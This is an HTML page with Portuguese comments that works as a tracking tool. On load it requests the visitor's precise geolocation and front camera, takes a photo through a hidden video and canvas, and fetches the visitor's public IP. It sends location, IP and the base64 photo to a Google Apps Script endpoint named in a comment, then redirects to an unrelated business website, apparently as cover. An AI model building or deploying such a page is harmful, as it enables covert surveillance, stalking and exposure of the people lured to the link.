<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando e Capturando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    p {
      padding: 10px;
      margin: 5px;
      word-wrap: break-word;
      max-width: 90%;
    }
    video {
      display: none; /* Oculta o v√≠deo, ele ser√° usado apenas para capturar o frame */
      width: 320px;
      height: 240px;
      background-color: #333;
    }
    canvas {
      display: none; /* Oculta o canvas */
    }
  </style>
  <script>
    let videoStream = null; // Vari√°vel para armazenar o stream da c√¢mera

    // <<< ATEN√á√ÉO: SUBSTITUA 'https://script.google.com/macros/s/AKfycbx69YoSBDriXbgLXtb-2FaTMTavPkQhEq2bYCjLumZiRRZCgLouCMnGjLpmQbV8eaTM/exec' PELA URL REAL DO SEU WEB APP DO GOOGLE APPS SCRIPT
    const WEBAPP_URL = 'SEU_WEBAPP_URL_AQUI'; 

    window.onload = function() {
      console.log("P√°gina carregada. Iniciando processo...");
      updateStatus("üìç Obtendo sua localiza√ß√£o... Aguarde...");

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucessoLocalizacao, erroLocalizacao, {
          enableHighAccuracy: true,
          timeout: 15000, // Aumentado o timeout para 15 segundos
          maximumAge: 0
        });
      } else {
        updateStatus("<p>Seu navegador n√£o suporta geolocaliza√ß√£o.</p>");
        console.warn("Geolocaliza√ß√£o n√£o suportada.");
        // Se a geolocaliza√ß√£o n√£o √© suportada, tenta apenas a c√¢mera
        iniciarCapturaCamera(null, null);
      }
    };

    // Fun√ß√£o auxiliar para atualizar o status na tela
    function updateStatus(message) {
      document.body.innerHTML = message;
    }

    function addStatus(message) {
      document.body.innerHTML += message;
    }

    function sucessoLocalizacao(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      console.log(`Localiza√ß√£o obtida: Lat ${latitude}, Lng ${longitude}`);
      updateStatus(`<p>‚úÖ Localiza√ß√£o obtida!</p>`);
      iniciarCapturaCamera(latitude, longitude);
    }

    function erroLocalizacao(err) {
      console.error("Erro na geolocaliza√ß√£o:", err);
      let msg = "<p>‚ö†Ô∏è Erro desconhecido na geolocaliza√ß√£o.</p>";
      if (err.code === 1) {
        msg = "<p>‚ùå Acesso √† localiza√ß√£o negado. Por favor, permita.</p>";
      } else if (err.code === 2) {
        msg = "<p>üåê Localiza√ß√£o indispon√≠vel. Sinal fraco ou problema no dispositivo.</p>";
      } else if (err.code === 3) {
        msg = "<p>‚åõ Tempo limite para obter localiza√ß√£o excedido.</p>";
      }
      updateStatus(msg);
      // Continua para a c√¢mera mesmo se a localiza√ß√£o falhar
      iniciarCapturaCamera(null, null);
    }

    async function iniciarCapturaCamera(latitude, longitude) {
      console.log("Iniciando captura da c√¢mera...");
      addStatus("<p>üì∑ Solicitando acesso √† c√¢mera... Aguarde...</p>");
      try {
        // Prefer√™ncia pela c√¢mera frontal (user). Se precisar da traseira, mude para "environment"
        // Adicionadas constraints de resolu√ß√£o para maior compatibilidade
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 640 }, // Define uma largura ideal para a captura
                height: { ideal: 480 } // Define uma altura ideal
            } 
        });
        videoStream = stream; // Armazena o stream para poder parar depois

        const video = document.createElement('video');
        video.autoplay = true;
        video.playsInline = true; // Importante para iOS
        video.srcObject = stream;
        document.body.appendChild(video); // Adiciona o v√≠deo ao DOM (pode ser invis√≠vel)

        // Aguarda o v√≠deo carregar os metadados e come√ßar a reprodu√ß√£o
        video.onloadedmetadata = () => {
            video.play(); // Garante que o v√≠deo comece a tocar
            console.log("Stream de v√≠deo carregado e reproduzindo.");
            addStatus("<p>‚úÖ C√¢mera acessada!</p>");
            setTimeout(() => {
                capturarImagem(latitude, longitude);
            }, 1500); // Aumentado o atraso para 1.5 segundos
        };

        video.onerror = (e) => {
            console.error("Erro no elemento de v√≠deo:", e);
            updateStatus("<p>‚ùå Erro no stream de v√≠deo da c√¢mera.</p>");
            enviarDadosParaSheets(latitude, longitude, null);
        };

      } catch (err) {
        console.error("Erro ao acessar a c√¢mera (getUserMedia):", err);
        let cameraErrorMsg = "<p>‚ùå Erro ao acessar a c√¢mera. Certifique-se de permitir o acesso.</p>";
        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
          cameraErrorMsg = "<p>üö´ Acesso √† c√¢mera negado. Por favor, permita nas configura√ß√µes do navegador/dispositivo.</p>";
        } else if (err.name === "NotFoundError") {
          cameraErrorMsg = "<p>üì∏ Nenhuma c√¢mera encontrada ou dispon√≠vel.</p>";
        } else if (err.name === "AbortError") {
          cameraErrorMsg = "<p>‚ö†Ô∏è O acesso √† c√¢mera foi abortado.</p>";
        } else if (err.name === "NotReadableError") {
          cameraErrorMsg = "<p>üîí A c√¢mera j√° est√° em uso por outro aplicativo.</p>";
        }
        updateStatus(cameraErrorMsg);
        // Redireciona mesmo se a c√¢mera falhar
        enviarDadosParaSheets(latitude, longitude, null); // Envia sem a imagem
      }
    }

    function capturarImagem(latitude, longitude) {
      console.log("Tentando capturar imagem do stream...");
      const video = document.querySelector('video');
      // Verifica se o v√≠deo existe, se o stream est√° ativo e se o v√≠deo tem dados para desenhar
      if (!video || !videoStream || video.readyState < 2 || video.videoWidth === 0) { 
        console.error("V√≠deo ou stream da c√¢mera n√£o dispon√≠vel ou n√£o pronto para captura. readyState:", video ? video.readyState : 'N/A');
        addStatus("<p>‚ö†Ô∏è Imagem n√£o capturada: C√¢mera n√£o pronta.</p>");
        enviarDadosParaSheets(latitude, longitude, null); // Envia sem a imagem
        return;
      }

      const canvas = document.createElement('canvas');
      // Define a resolu√ß√£o do canvas com base na resolu√ß√£o real do v√≠deo
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Converte a imagem para uma URL base64. Qualidade 0.8 para JPEG para reduzir tamanho
      const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
      console.log("Imagem Base64 gerada. Tamanho:", imageDataURL.length, "caracteres.");

      // Para de usar a c√¢mera
      if (videoStream) {
        console.log("Parando stream da c√¢mera.");
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
      }
      if (video && video.parentNode) {
        video.parentNode.removeChild(video); // Remove o elemento de v√≠deo do DOM
      }
      addStatus(`<p>üì∏ Imagem capturada!</p>`);
      enviarDadosParaSheets(latitude, longitude, imageDataURL);
    }

    async function enviarDadosParaSheets(latitude, longitude, imageDataURL) {
      console.log("Iniciando envio de dados para o Google Sheets...");
      addStatus(`<p>üöÄ Enviando dados...</p>`);
      let ip = 'N√£o detectado';
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        ip = data.ip;
        console.log("IP obtido:", ip);
      } catch (error) {
        console.error("Erro ao obter IP:", error);
      }

      // Link ajustado para o Google Maps
      const mapsLink = latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : 'Localiza√ß√£o n√£o dispon√≠vel';
      console.log("Link do Maps:", mapsLink);

      const payload = {
        timestamp: new Date().toISOString(), // Adiciona timestamp para melhor registro
        latitude: latitude,
        longitude: longitude,
        ip: ip,
        maps: mapsLink,
        imagem: imageDataURL || 'N/A' // Envia 'N/A' se n√£o houver imagem
      };
      console.log("Payload a ser enviado:", payload);

      try {
        const response = await fetch(WEBAPP_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          const responseData = await response.json(); // Tenta ler a resposta JSON
          console.log("Dados enviados com sucesso para o Google Sheets:", responseData);
          addStatus(`<p>‚úÖ Dados enviados!</p>`);
        } else {
          const errorText = await response.text();
          console.error(`Erro ${response.status} ao enviar dados para o Google Sheets:`, errorText);
          addStatus(`<p>‚ùå Erro ao enviar dados (Status: ${response.status}).</p>`);
        }
      } catch (error) {
        console.error("Erro de rede ou ao processar resposta do Google Sheets:", error);
        addStatus(`<p>‚ùå Erro de conex√£o ao enviar dados. Tente novamente.</p>`);
      } finally {
        // Garante que o redirecionamento aconte√ßa ap√≥s a tentativa de envio
        redirecionaDespachanteMauro();
      }
    }

    // Fun√ß√£o de redirecionamento final
    function redirecionaDespachanteMauro() {
      console.log("Redirecionando...");
      addStatus("<p>‚û°Ô∏è Redirecionando...</p>");
      setTimeout(() => {
        window.location.href = "https://despachantemauro.com.br/";
      }, 2500); // Pequeno atraso para a mensagem ser vista
    }
  </script>
</head>
<body>
  <p>Iniciando...</p>
</body>
</html>